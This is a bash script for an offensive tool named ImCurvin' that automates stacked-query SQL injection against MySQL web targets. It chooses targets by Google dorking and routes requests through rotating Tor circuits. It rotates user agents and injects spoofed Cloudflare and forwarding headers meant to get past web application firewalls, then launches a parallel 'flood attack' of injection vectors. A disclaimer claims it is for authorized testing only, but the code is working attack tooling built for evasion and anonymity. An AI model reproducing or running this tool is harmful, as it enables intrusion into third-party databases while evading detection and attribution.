#!/bin/bash
 
# ImCurvin' v1.3.0
# Copyright 2026 Skokoo
# Licensed under the Apache License, Version 2.0

target_url="$1"
export DEFIANCE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
export ROOT_LOG_FILE="$DEFIANCE_DIR/../targetDef.log"

ayamaa=$(date +%H:%M:%S)

source "$DEFIANCE_DIR/../tamper/hungry.sh"
source "${DEFIANCE_DIR}/vector.sh"

heyoii_d_eb() {
  trap - SIGINT SIGTERM EXIT
  echo -e "\n\n\e[0;31m[\e[0m!\e[0;31m]\e[0m Interrupted. Killing all process.."
  kill 0 2>/dev/null
  exit 130
}

trap 'heyoii_d_eb' SIGINT SIGTERM
custom_proxy=""
export TOR_CIRCUITS=(9050 9052 9054 9056 9058 9060)

export DEFIANCE_UA=(
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0"
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/605.1.15"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
)
# logo
print_defiance_logo(){
  echo -e "    \e[38;5;45m____        \e[38;5;39m______           \e[38;5;27m_                 \e[0m"
  echo -e "   \e[38;5;45m/  _/___ ___ \e[38;5;39m/ ____/_  _______\e[38;5;27m(_)___  ____ _    \e[0m"
  echo -e "   \e[38;5;51m/ // __ \`__ \\\\\e[38;5;45m/ /   / / / / __\e[38;5;39m_/ / __ \\\\/ __ \` /    \e[0m"
  echo -e " \e[38;5;51m_/ // / / / / \e[38;5;45m/ /___/ /_/ / /  \e[38;5;39m/ / / / / /_/ /     \e[0m"
  echo -e "\e[38;5;51m/___/_/ /_/ /_/\e[38;5;51m\\\\____/\\__,_/_/  \e[38;5;45m/_/_/ /_/\\__, /      \e[0m"
  echo -e "                                       \e[38;5;39m/____/       \e[0m"
  echo -e "\n[*] ImCurvin in the curve curing ;]"
 echo -e "[*] \e[1mPLEASE NOTE:\e[0m ImCurvin is optimized ONLY for \e[1mMySQL environments that allow multi-statement execution (Stacked Queries)\e[0m"
  if termux-am >/dev/null 2>&1; then
    echo -e "\e[38;5;196m[i] SYSTEM NOTICE (TERMUX):\e[0m If you zoom in excessively and experience layout tearing, please zoom out to restore interface alignment.\e[0m"
  fi
}
curl() {
    local args=("$@")
    command curl ${args[@]}
}
# HTTP pollution, air pollution.
# Told waf that this is JSON lol.
braindamage() {
  local choice=$((RANDOM % 3))
  local cf_ray
  cf_ray=$(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 16 | head -n 1)

  if [ "${REQ_METHOD:-POST}" = "GET" ]; then
    case "$choice" in
      0) echo "-H \"Content-Type:application/json\" -H \"X-Forwarded-For:127.0.0.1\" -H \"CF-Connecting-IP:172.67.$((RANDOM % 254 + 1)).$((RANDOM % 254 + 1))\" -H \"CF-RAY:${cf_ray}-CGK\"" ;;
      1) echo "-H \"Content-Type:application/json\" -H \"CF-Visitor:{\\\"scheme\\\":\\\"https\\\"}\"" ;;
      2) echo "-H \"Content-Type:application/json\" -H \"X-WAF-Bypass:True\" -H \"CF-IPCountry:US\" -H \"True-Client-IP:103.21.244.$((RANDOM % 254 + 1))\"" ;;
    esac
  else
    case "$choice" in
      0) echo "-H \"Content-Type:application/json\" -H \"Authorization:Bearer $cf_ray\" -H \"X-WAF-Bypass:True\" -H \"CF-IPCountry:US\"" ;;
      1) echo "-H \"Content-Type:application/json\" -H \"X-Requested-With:XMLHttpRequest\" -H \"CF-RAY:${cf_ray}-CGK\" -H \"True-Client-IP:103.21.244.$((RANDOM % 254 + 1))\"" ;;
      2) echo "-H \"Content-Type:application/json\" -H \"Cache-Control:no-cache,no-store\" -H \"Pragma:no-cache\" -H \"X-Forwarded-For:127.0.0.1\"" ;;
    esac
  fi
}
# dork, goofle dorking. I mean google.
dork() {
  local ayamaa
  ayamaa=$(date +%H:%M:%S)
  local dom="$1"
  echo -e "[\033[34m${ayamaa}\033[0m] [i] Launching Universal Google Dorking..."
  sleep 2

  local gerbang
  gerbang=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}

    local prx="--socks5-hostname 127.0.0.1:$gerbang"

    local samaran
    samaran=${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}
      local q="site:${dom} (intitle:\"login\" inurl:\"login\") OR inurl:search OR inurl:api OR inurl:v1"

      local enc
      enc=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$q'''))")

      local raw
      raw=$(curl "$prx" -s -m 10 -A "$samaran" "https://google.com{enc}&gbv=1")

      local -a list
      while read -r line; do
        if [[ -n "$line" ]]; then
          local decoded_line
          decoded_line=$(python3 -c "import urllib.parse; print(urllib.parse.unquote('''$line'''))")
          if [[ "$decoded_line" == *"$dom"* ]]; then list+=("$decoded_line"); fi
        fi
      done < <(echo "$raw" | grep -oP '(?<=url\?q=)[^&]*' | sort -u | head -n 10)

      if [ ${#list[@]} -eq 0 ]; then
        echo -e "[\033[34m${ayamaa}\033[0m] [\033[31m-\033[0m]\e[0m No links found on Google Index." >&2
        exit 1
      fi

      echo -e "\n[\033[34m${ayamaa}\033[0m] [\033[1;34m+\033[0m] Top ${#list[@]} Discovered Targets:"
      for i in "${!list[@]}"; do echo -e "[\e[1;34m$((i+1))\e[0m] ${list[$i]}"; done

      echo -n -e "\n\e[0;32m[?]\e[0m Select target (1-${#list[@]}) or 's' to skip: "
      read -r -n 1 sel
      echo ""

      sel=$(echo "$sel" | tr '[:upper:]' '[:lower:]')

      if [[ "$sel" =~ ^[0-9]+$ ]] && [ "$sel" -le "${#list[@]}" ] && [ "$sel" -gt 0 ]; then
        local idx=$((sel - 1))
        export target_url="${list[$idx]}"
        echo -e "\e[0;32m[+]\e[0m Locked on: \e[1;34m$target_url\e[0m"
        echo -e "[\033[34m${ayamaa}\033[0m] [i] Testing connection to selected target..."

        local test_status
        test_status=$(curl "$prx" -s -o /dev/null -w "%{http_code}" --max-time 10 "$target_url")

        if [ "$test_status" = "000" ]; then
          echo -e "[\033[31m${ayamaa}\033[0m] [->] Selected URL connection timed out." >&2
          exit 1
        elif [ "$test_status" -lt 200 ] || [ "$test_status" -ge 400 ]; then
          echo -e "[\033[31m${ayamaa}\033[0m] [->] Target returned dead status: HTTP $test_status"  >&2
          exit 1
        fi

        echo -e "[\033[32m${ayamaa}\033[0m] [+] Target is alive (HTTP $test_status)."
        return 0
      else
        echo -e "[\033[31m${ayamaa}\033[0m] [x] Google Dorking skipped or invalid selection. Exiting tool."  >&2
        exit 1
      fi
    }                                       
                helping() {
          echo -e "->>\n"
          echo -e "Usage: imcurvin -u <TARGET_URL> [OPTION]\n"
          echo -e "Available Options:"
          echo -e "  -u/--url <URL>           : Specify the target website URL (Required)"
          echo -e "  -tech/--technique        : Display advanced technical methodologies and framework configurations (READ THIS IF YOU HAVE NOT YET, TO PREVENT UNINTENDED ACTIONS)"
          echo -e "  -rec/--recon             : Run environment reconnaissance"
          echo -e "  -shwpld/--show-payload   : Show payloads actively during execution"
          echo -e "  -val/--validate          : Enable post-scan Python validation engine for latency isolation"
          echo -e "  -cookie=<string>         : Ingest custom session cookies (e.g., -cookie=\"PHPSESSID=123\")"
          echo -e "  -valnow/--validate-now   : Validate the log file now"
          echo -e "  -skip                    : Skipping \"Testing connection to target url\" (TESTING)"
          echo -e "  -h/--help                : Display this help guide"
          echo -e "\n->>"
          exit 0
        }
                show_tech() {

          echo -e "\n\e[34m1. Reconnaissance & Structural Parameter Extraction\e[0m"
          echo -e "   • \e[1mHybrid URL Parsing\e[0m     : PreFlight HTTP Redirection tracking & destination lock."
          echo -e "   • \e[1mGoogle Dorking Recon\e[0m   : Automated target attack surface expansion."
          echo -e "   • \e[1mMulti-Matrix Parser\e[0m    : RFC-compliant Query, Inline Path (;), & Heuristic Fallback extraction."
          echo -e "   • \e[1mRaw POST Interceptor\e[0m   : Automated detection of raw payload strings via TTY interactive hooks."
          echo -e "   • \e[1mHTML DOM Footprinting\e[0m  : Server-side token exclusion engine targeting form elements & data-* attributes.\n"

          echo -e "\e[34m2. Network Evasion & Tor Routing\e[0m"
          echo -e "   • \e[1mMulti-Port Tor Export\e[0m  : Eliminates bottleneck via multi-port arrays (9050, 9052+)."
          echo -e "   • \e[1mLoad-Balanced Request\e[0m  : Parallel threads distribution across 6 distinct Tor circuits."
          echo -e "   • \e[1mContinuous Mutation\e[0m    : Dynamic Multi-IP rotation & automated thread-level UserAgent mutation."
          echo -e "   • \e[1mJitter Insertion\e[0m     : Non-linear time delays to bypass behavioral AI traffic filters.\n"

          echo -e "\e[34m3. Advanced WAF Bypass & Obfuscation (Synchronized Dual-Vector Engine)\e[0m"
          echo -e "   • \e[1mStacked Queries\e[0m      : Independent dynamic SQL instruction injection via [;] delimiter."
          echo -e "   • \e[1mHPP Splitting\e[0m        : HTTP Parameter Pollution masking to exploit parser discrepancies."
          echo -e "   • \e[1mJSON-Header Tunneling\e[0m: Encapsulates Base64 JSON payloads inside custom headers."
          echo -e "   • \e[1mPayload Masking\e[0m      : space2comment, randomized case, XOR, & Base64 matrix encoding."
          echo -e "   • \e[1mHeader Spoofing\e[0m      : Spoofed IP headers & Cloudflare bypass chain injection."
          echo -e "   • \e[1mCipher Suite Hardening\e[0m: Enforces strict TLS 1.3 & custom cipher negotiation matrices."
          echo -e "   • \e[1mProtocol Exploitation\e[0m: JA3/JA4 TLS Fingerprint Spoofing & HTTP/2 Rapid Reset vectors.\n"

          echo -e "\e[34m4. Automated IP Re-Birth (Defensive Evasion Loop)\e[0m"
          echo -e "   • \e[1mBlock Detection\e[0m      : Monitors HTTP 403/429 mitigation triggers."
          echo -e "   • \e[1mInstant Rotation\e[0m     : Automated 'SIGNAL NEWNYM' circuit rebuild within milliseconds.\n"

          echo -e "\e[34m5. Post-Scan Validation & Benchmarking\e[0m"
          echo -e "   • \e[1mMicrosecond Telemetry\e[0m: Granular time_total auditing via low-level curl write-out bindings."
          echo -e "   • \e[1mLatency Isolation\e[0m    : Python-backed filter to isolate network jitter from true SQL delays."
          echo -e "   • \e[1mEnvironment Safeguard\e[0m: Non-MySQL footprint detection & automated thread abortion.\n"
          
          exit 0
        }                                       
        print_defiance_logo
        for cmd in nc curl tor flock pgrep xxd python3; do
          case "$cmd" in
            nc)
              if ! command -v nc &> /dev/null && ! command -v netcat &> /dev/null; then
                echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m WARNING: 'netcat' is not installed on your terminal." >&2
                echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m Please install netcat-openbsd first before running imCurvin'."
                exit 1
              fi
            ;;
            *)
              if ! command -v "$cmd" &> /dev/null; then
                echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m WARNING: '$cmd' is not installed on your terminal." >&2
                echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m Please install $cmd first before running imCurvin'."
                exit 1
              fi
            ;;
          esac
        done
        if [[ "$show_help" = "true" ]]; then
          helping
        fi
    if [ "$valnow" = "true" ]; then
       echo -e "[\033[34m${ayamaa}\033[0m] [i] Shortcut: Launching standalone Defiance Log Analyst..."
    sleep 1
    if [ -f "$DEFIANCE_DIR/../validators/defval.py" ]; then
        if [ -s "$ROOT_LOG_FILE" ]; then
            python3 "$DEFIANCE_DIR/../validators/defval.py"
            exit 0
        else
            echo -e "[\033[31m${ayamaa}\033[0m] [->] Error: Log file is empty. Nothing to validate." >&2
            exit 1
        fi
    else
        echo -e "[\033[31m${ayamaa}\033[0m] [->] Error: defval.py not found." >&2
        exit 1
    fi
fi
        if [[ "$tech" = "true" ]]; then
          show_tech
        fi

        if [ -z "$target_url" ]; then
          echo -e "\e[0;31m[\e[0m!\e[0;31m]\e[0m Error: URL not specified." >&2
          echo -e "\e[0;37m[\e[0mi\e[0;37m]\e[0m Please refer to the option guide below:\n"
          helping
          exit 1
        fi                              

        echo -e "\n[\033[34mWARNING\033[0m] ImCurvin is designed for \033[1mauthorized security testing and educational purposes only.\033[0m"
        echo -e "Running this tool against targets without priorwritten consent is strictly illegal. \033[1mThe developer assumes no liability and not responsible for any misuse, damage, or system instability caused by this software.\033[0m By executing this script, you agree to these terms."
        sleep 2            
    
        echo -e "\n[\033[34m${ayamaa}\033[0m] [i]\e[0m Checking for TOR terminal service..."

        if pgrep -x "tor" >/dev/null 2>&1; then
          echo -e "[\033[34m${ayamaa}\033[0m] [i] \033[1mTor terminal service detected as active.\033[0m"
        else
          echo -e "[\033[34m${ayamaa}\033[0m] [->] WARNING: Tor terminal service is not detected/running."
          echo -e "[\033[34m${ayamaa}\033[0m] [->]\e[0m Run 'tor' command in a new terminal before using Defiance Mode."
          echo -e "[\033[34m${ayamaa}\033[0m] [->] Operation aborted due to environment mismatch."
          exit 1
        fi

        echo -e "[\033[34m${ayamaa}\033[0m] [i] Tracing target redirections."
        recon_port=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
          recon_proxy="--socks5-hostname 127.0.0.1:$recon_port"
          initial_url="$target_url"

          final_destination_url=$(curl "$recon_proxy" --connect-timeout 5 --retry 2 -m 8 -s -o /dev/null -w "%{url_effective}" -L "$initial_url")

          if [ "$initial_url" != "$final_destination_url" ]; then
            echo -e "[\033[34m${ayamaa}\033[0m] [!] Target redirected to: \033[32m$final_destination_url\033[0m"
            read -p "[?] Is this URL correct? (y/n): " user_confirm
            user_confirm=$(echo "$user_confirm" | tr '[:upper:]' '[:lower:]')

            case "$user_confirm" in
              y|yes)
                echo -e "[\033[34m${ayamaa}\033[0m] [->] Continue with Redirected URL."
                export target_url="$final_destination_url"
              ;;
              *)
                echo -e "[\033[31m${ayamaa}\033[0m] [i] Continue with default URL will result in an unwanted error,"
                clean_domain=$(echo "$target_url" | sed -e 's|^[^/]*//||' -e 's|/.*||' -e 's|:.*||')
                dork "$clean_domain"
                dork_status=$?
                if [ $dork_status -ne 0 ]; then
                  exit 1
                fi
              ;;
            esac
          fi
if [[ "$skip" = "true" ]]; then
          echo -e "[\033[34m${ayamaa}\033[0m] [i]\e[0m Testing connection to target URL."
          http_status=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "$target_url")

          case "$http_status" in
            000)
              echo -e "[\033[34m${ayamaa}\033[0m] [->]\e[0m Web Connection time out [10 Seconds]. The target URL might be very unstable."
              exit 1
            ;;
            2??|3??)
            ;;
            *)
              echo -e "[\033[34m${ayamaa}\033[0m] [->]\e[0m Target URL returned HTTP Status $http_status."
              exit 1
            ;;
          esac
fi
                  if [ -f "$DEFIANCE_DIR/../validators/ayam.py" ]; then           
            ayamaa=$(date +%H:%M:%S)
            echo -e "[\033[34m${ayamaa}\033[0m] [i] Analyzing parameter.."
            
            eye_report=$(python3 "$DEFIANCE_DIR/../validators/ayam.py" -u "$target_url")
            
            param_type=$(echo "$eye_report" | cut -d'|' -f1)
            discovered_keys=$(echo "$eye_report" | cut -d'|' -f3)          
            python_method=$(echo "$eye_report" | cut -d'|' -f4)

            case "$param_type" in
              "QUERY_PARAM")                                               
                echo -e "[\033[34m${ayamaa}\033[0m] [\033[1;34m+\033[0m] \033[1mActive Parameters Spotted > ($discovered_keys) [Mode: $python_method]\033[0m"
                export WORDLIST_MYSQL="$DEFIANCE_DIR/../data/HAHA.txt"
                export REQ_METHOD="$python_method" 
                export TARGET_PARAM="$discovered_keys" 
              ;;

              "PATH_PARAM"|"NO_PARAM"|*)                                               
                echo -e "[\033[34m${ayamaa}\033[0m] [i]\033[1m No parameters detected. Aborted.\033[0m" >&2
                exit 1
              ;;
            esac
          fi           
              
                    cookie_flag=""
          if [ -n "$custom_cookie" ]; then
            echo -e "[\033[34m${ayamaa}\033[0m] [i] Verifying custom cookie integrity..."           
            check_cookie=$(curl -s -o /dev/null -w "%{http_code}" -b "$custom_cookie" --max-time 10 "$target_url")
                        
            if [ "$check_cookie" = "000" ] || [ "$check_cookie" -lt 200 ] || [ "$check_cookie" -ge 400 ]; then
              echo -e "[\033[31m${ayamaa}\033[0m] [!] Custom Cookie rejected by server (HTTP $check_cookie). Dropping cookie flag." >&2
              custom_cookie=""
            else
              cookie_flag="-b $custom_cookie"
              echo -e "[\033[34m${ayamaa}\033[0m] [+] Custom Cookie validated and locked: $custom_cookie"
            fi
          fi

          echo -e "[\033[34m${ayamaa}\033[0m] [i] Performing database environment verification.."
          server_fingerprint=$(curl "$recon_proxy" -m 5 -s -I "$target_url" | grep -Ei "(Server|X-Powered-By|Set-Cookie|X-DDoS|WAF)")

          if echo "$server_fingerprint" | grep -qEi "(oracle|postgre|mssql|microsoft-iis|supabase)"; then
            echo -e "\n[\033[34m${ayamaa}\033[0m] [\e[0;31m!\e[0m] Target rejected, Non MySQL environment fingerprint." >&2
            echo -e "[i] Footprint: $(echo "$server_fingerprint" | tr '\r\n' ' ')"
            echo -e "[\033[34m${ayamaa}\033[0m][->] Revert. Operation aborted to prevent structural asset wastage."
            exit 1
          else
            echo -e "[\033[34m${ayamaa}\033[0m] [\033[1;34m+\033[0m]\e[0m \033[1mTarget environment matches MySQL compliance directives.\033[0m"
          fi

          if echo "$server_fingerprint" | grep -qEi "(php|PHPSESSID|apache|litespeed)" || [[ "$target_url" == *"testphp"* ]]; then
            echo -e "[\033[34m${ayamaa}\033[0m] [i] This web envi is outdated/just a test, to ensure the payloads to be executed, \033[1mthe tamper has been downgraded \033[0m[Space2comment, randomcase only]."
          fi

          sleep 1

          if [ "$enable_val" = "true" ] && [ -s "$ROOT_LOG_FILE" ]; then
            echo -e "[\033[34m${ayamaa}\033[0m] [?] Your log file is not empty."
            read -p "[\033[34m${ayamaa}\033[0m] Do you want to overwrite it? (y/n): " tanya
            tanya=$(echo "$tanya" | tr '[:upper:]' '[:lower:]')

            case "$tanya" in
              y|yes)
                > "$ROOT_LOG_FILE"
                echo -e "[\033[34m${ayamaa}\033[0m] [\033[34m+\e[0m] \033[1mLog overwritten.\033[0m\n"
              ;;
              *)
                echo -e "[\033[34m${ayamaa}\033[0m] [i] Previous log entries will also be scanned."
              ;;
            esac
          fi

          echo -e "[\033[34m${ayamaa}\033[0m] [i] Launching dualvector synchronized flood attack against \e[1;34m$target_url\e[0m...\n"

          vector_sqli_agressor_left &
          pid_vector1=$!

          vector_sqli_agressor_right &
          pid_vector2=$!

          wait $pid_vector1 $pid_vector2

          echo -e "\n[\033[34m${ayamaa}\033[0m] [\033[1mCOMPLETE\033[0m]\e[0m Attack sequence completed. Input to Defiance Log Analyst.."
          sleep 1

          if [ "$enable_val" = "true" ]; then
            if [ -f "$DEFIANCE_DIR/../validators/defval.py" ]; then
              python3 "$DEFIANCE_DIR/../validators/defval.py"
            else
              echo -e "[\033[34m${ayamaa}\033[0m] [->] defval.py not found. Skipping validate."
            fi
          else
            echo -e "[\033[34m${ayamaa}\033[0m] [i] Skipping validating, use the option -val to enable it."
          fi

          echo ""



        
              
            
          